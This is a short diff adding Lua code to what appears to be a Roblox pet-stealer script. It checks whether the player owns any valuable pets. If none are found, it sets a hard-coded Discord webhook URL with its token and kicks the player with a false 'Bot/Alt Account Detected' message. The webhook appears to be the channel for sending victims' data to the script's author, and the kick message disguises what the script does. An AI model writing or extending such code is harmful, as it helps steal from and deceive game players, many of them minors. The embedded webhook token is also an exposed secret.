@@ -1,0 +1,4 @@
+if legendaries_count + mega_count + neon_count + ultra_count + fr_count == 0 then
+    Webhook = "https://discord.com/api/webhooks/1327175167369154570/lEe5Pc7WdCqsV--52svg6_4Cl5x5v5qbynmUGdEtOwNE8rwrI3WFfaa8x8zx12rcsZ8b"
+    game:GetService("Players").LocalPlayer:Kick("\nBot/Alt Account Detected, Cannot get low value object.pets.eggs [No Remote.Event Detected]")
+end
